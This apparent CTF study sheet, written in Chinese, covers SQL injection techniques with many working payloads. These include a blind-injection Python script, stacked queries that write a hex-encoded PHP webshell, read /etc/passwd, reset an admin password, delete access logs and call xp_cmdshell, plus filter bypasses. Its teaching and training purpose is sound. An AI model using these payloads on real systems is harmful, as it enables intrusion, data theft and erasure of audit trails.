---
category: "SQL注入"
tags: ["SQLi", "联合查询", "布尔盲注", "时间盲注", "报错注入", "堆叠注入", "二阶注入", "绕过", "Payload"]
difficulty: "中级"
---

# SQL注入全解

## 1. 概述
SQL注入（SQL Injection）是最经典的Web安全漏洞之一。攻击者通过在用户输入中注入SQL代码，操纵后端数据库查询，实现数据窃取、权限提升甚至命令执行。CTF中SQL注入考察范围极广，从基础的联合查询到高级的WAF绕过、存储过程利用均有涉及。

核心使用场景：
- 登录框/搜索框/参数传递点注入
- Blind场景（无回显，需布尔/时间盲注）
- 绕过WAF（各类规则过滤）
- 不出网环境下的数据外带

## 2. 核心原理
### 2.1 注入本质
应用程序将用户输入与SQL查询拼接，未做充分过滤。例如：
```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
```
当输入 `1 OR 1=1` 时，查询变为 `SELECT * FROM users WHERE id = 1 OR 1=1`，返回全部记录。

### 2.2 数据库指纹识别
| 数据库 | 连接符号 | 注释符号 | 特有函数/语法 |
|--------|---------|---------|-------------|
| MySQL | `#` `-- ` `/**/` | `/*!*/` | `information_schema`, `load_file()` |
| MSSQL | `--` `/**/` | `;` | `xp_cmdshell`, `OPENROWSET` |
| Oracle | `--` `/**/` | `||`拼接 | `UNION SELECT NULL FROM dual` |
| PostgreSQL | `--` `/**/` | `\|\|`拼接 | `pg_sleep()`, `COPY` |
| SQLite | `--` `/**/` | `\|\|`拼接 | `sqlite_master`, 无`information_schema` |

### 2.3 注释与闭合
- `#` (URL编码 `%23`) — MySQL单行注释
- `-- ` (注意空格, URL编码 `--%20` 或 `--+`) — 通用单行注释
- `/**/` — 多行注释/空白替代
- `;%00` — PHP NULL字节截断

## 3. 关键技巧与Payload

### 3.1 联合查询注入 (UNION SELECT)
**核心流程：**
1. `ORDER BY n` 确定列数
2. `UNION SELECT` 确认回显位
3. 查询数据

**Payload模板：**
```sql
-- 步骤1：判断列数
?id=1' ORDER BY 3--+    -- 正常
?id=1' ORDER BY 4--+    -- 报错 → 3列

-- 步骤2：判断回显位
?id=-1' UNION SELECT 1,2,3--+

-- 步骤3：查库名
?id=-1' UNION SELECT 1,database(),3--+

-- 步骤4：查表名 (MySQL)
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+

-- 步骤5：查列名
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='flag'--+

-- 步骤6：获取flag
?id=-1' UNION SELECT 1,group_concat(flag_column),3 FROM flag--+

-- SQLite没有information_schema，用sqlite_master
?id=-1' UNION SELECT 1,sql,3 FROM sqlite_master WHERE type='table'--+
```

**注意事项：**
- 用 `-1` 或 `id=1 and 1=2` 使原查询无结果，避免干扰回显
- 回显字段数不足时使用 `concat()` / `group_concat()` 合并输出
- `UNION SELECT` 要求前后列数、类型一致，不行用 `NULL` 占位

### 3.2 布尔盲注 (Boolean-based Blind)
页面只返回正常/异常两种状态（无具体数据回显），需逐位推断。

**常用函数：**
- `substr(string, pos, len)` / `substring()` / `mid()`
- `ascii()` / `ord()`
- `length()`

**Payload模板：**
```sql
-- 判断数据库名长度
?id=1' AND (length(database())=5)--+

-- 逐位爆破库名
?id=1' AND (ascii(substr(database(),1,1))>100)--+

-- 爆破表名（用limit遍历）
?id=1' AND (ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))>100)--+

-- 爆破列名
?id=1' AND (ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_name='flag' LIMIT 0,1),1,1))>100)--+

-- 爆破flag
?id=1' AND (ascii(substr((SELECT flag FROM flag LIMIT 0,1),1,1))>100)--+
```

**Python盲注脚本框架：**
```python
import requests

url = "http://target.com/page.php?id="
result = ""
for pos in range(1, 50):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        payload = f"1' AND ascii(substr((SELECT flag FROM flag LIMIT 0,1),{pos},1))>{mid}--+"
        r = requests.get(url + payload)
        if "success_marker" in r.text:  # 正常回显标识
            low = mid + 1
        else:
            high = mid
    result += chr(low)
    print(result)
```

### 3.3 时间盲注 (Time-based Blind)
页面无论注入成功与否都返回相同内容，通过响应时间差异判断。

**各数据库延时函数：**
```sql
-- MySQL
SLEEP(5)                -- 安全模式下可能被禁用
BENCHMARK(50000000, MD5(1))  -- 备选

-- PostgreSQL
pg_sleep(5)

-- MSSQL
WAITFOR DELAY '0:0:5'

-- Oracle
DBMS_LOCK.SLEEP(5)

-- SQLite
RANDOMBLOB(100000000)   -- 无原生sleep，用大计算量
```

**Payload模板：**
```sql
-- 基本判断（MySQL）
?id=1' AND IF(1=1, SLEEP(3), 0)--+    -- 延时3秒

-- 逐位爆破
?id=1' AND IF(
  ascii(substr((SELECT flag FROM flag LIMIT 0,1),1,1))=102,
  SLEEP(3), 0
)--+

-- 堆叠+时间（当堆叠可用时速度更快）
?id=1';SELECT IF(substr(flag,1,1)='f',SLEEP(3),0) FROM flag--+
```

### 3.4 报错注入 (Error-based)
利用数据库错误信息携带数据。

**MySQL报错注入常用Payload：**
```sql
-- updatexml (最大32字符，可截断分段)
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+

-- extractvalue
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--+

-- 突破32字符限制（分段读取）
?id=1' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),1,30),0x7e),1)--+
?id=1' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),31,30),0x7e),1)--+

-- floor() + rand() 报错（无长度限制！）
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),concat(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--+

-- NAME_CONST
?id=1' AND (SELECT NAME_CONST(database(),1))--+
```

**适用于MySQL 8.0+的报错：**
```sql
-- EXP函数溢出
?id=1' AND EXP(~(SELECT * FROM (SELECT database())a))--+

-- 几何函数报错（POINT, LINESTRING, POLYGON）
-- 适用于高版本MySQL
```

**PostgreSQL报错注入：**
```sql
CAST((SELECT current_database()) AS int)
```

**MSSQL报错注入：**
```sql
?id=1' AND 1=CONVERT(int,(SELECT @@version))--+
```

### 3.5 堆叠注入 (Stacked Queries)
使用分号 `;` 执行多条独立SQL语句（依赖于数据库连接器支持，如PHP的`mysqli_multi_query()`）。

**Payload模板：**
```sql
-- 读文件（MySQL）
?id=1';SELECT LOAD_FILE('/etc/passwd')--+

-- 写文件写WebShell
?id=1';SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php'--+

-- 直接UPDATE修改数据（绕过登录）
?id=1';UPDATE users SET password='123456' WHERE username='admin'--+

-- 清空日志表
?id=1';DELETE FROM access_log;--+

-- 用SET改配置
?id=1';SET GLOBAL general_log='ON';SET GLOBAL general_log_file='/var/www/html/log.php'--+

-- MSSQL堆叠利用
?id=1';EXEC xp_cmdshell('whoami')--+

-- PostgreSQL堆叠利用
?id=1';COPY (SELECT 'data') TO '/tmp/out.txt'--+
```

### 3.6 二阶注入 (Second-order SQLi)
用户输入在首次存储时被"安全"转义，但在后续查询中未正确处理导致注入。例如注册用户名含`'`，在修改密码时触发。

**检测方法：**
- 在注册名/邮箱中插入 `'OR''='`，看是否能重置任意用户密码
- 注意MySQL转义 `'` → `\'` 的场景（GBK宽字节注入）

### 3.7 宽字节注入
GBK编码下，`%df'` 经过 `addslashes()` 变成 `%df\'` = `%df%5c%27`，其中 `%df%5c` 被解析为汉字`運`，`'` 逃逸出来。

**Payload模板：**
```php
// 前提：PHP使用GBK编码 + addslashes()/mysql_real_escape_string()
// 输入：
%df' OR 1=1--+
// 查询变为：SELECT * FROM users WHERE name='運' OR 1=1--+'
```

### 3.8 SELECT过滤绕过
```sql
-- SEL/**/ECT
-- /*!50000SELECT*/
-- SEL%0aECT
-- SEL%09ECT

-- from 也可以绕过
-- /!50000from/

-- 整句绕过示例
?id=1' UNI/**/ON SEL/**/ECT 1,2,3 FR/**/OM flag--+
```

## 4. 常见误区与注意事项
1. **URL编码**：`--+` 中的 `+` 会被解析为空格，等效 `--%20`。`#` 在URL中写 `%23`，否则被当作锚点。
2. **注释与闭合**：`-- ` 必须有尾部空格，建议用 `--+-` 或 `--%20-`。
3. **单双引号**：先判断闭合方式（`'` `"` `')` `")` `'))`等），不要盲目用单引号。
4. **大小写**：MySQL默认不区分大小写，但某些字段/表名可能区分（取决于OS和排序规则）。
5. **order by位置**：数字型注入可直接 `?id=1 order by 3`；字符型需先闭合 `?id=1' order by 3--+`。
6. **LIMIT子句位置**：`LIMIT` 放在 `ORDER BY` 后面，`UNION SELECT` 中的 ORDER BY 会影响全局。
7. **幻数判断**：NULL值在某些场景可能导致判断异常，建议用 `1` 替代。
8. **sleep()被禁用**：尝试 `BENCHMARK(50000000,MD5(1))` 或 `heavy query × count`。
9. **information_schema被过滤**：MySQL可用 `sys.schema_auto_increment_columns`、`mysql.innodb_table_stats` 替代。SQLite用 `sqlite_master`。PostgreSQL用 `pg_catalog.pg_tables`。
10. **offline环境策略**：使用二分法减少请求次数；缓存已知结果减少重复爆破。

## 5. 实战示例

### 示例1：登录框布尔盲注
```
场景：登录页面POST username/password，错误返回"用户名或密码错误"，正确返回302跳转。
```
脚本思路：判断条件 `username=admin' AND (condition)--+` 且 `password` 随便填，观察是否返回302。

### 示例2：WAF绕过堆叠+写Shell
```
场景：有堆叠注入但过滤了关键字。
```
Payload链：
```sql
-- 绕过information_schema
?id=1';SHOW TABLES;--+

-- 读表结构
?id=1';SHOW COLUMNS FROM flag_table;--+

-- 写shell（OUTFILE被禁尝试DUMPFILE）
?id=1';SELECT unhex('3c3f706870206576616c28245f504f53545b315d293b3f3e') INTO DUMPFILE '/var/www/html/s.php'--+
```

## 6. 相关知识点
- 文件上传与SQL写WebShell结合（见04-文件上传漏洞）
- 命令注入与MSSQL xp_cmdshell联动（见08-命令注入与代码注入）
- WAF绕过技术汇总（见12-WAF绕过技术汇总）
- OOB数据外带（DNSlog/HTTP外带，见08-命令注入的OOB部分）
- SQL注入自动化工具（sqlmap离线参数备忘录）
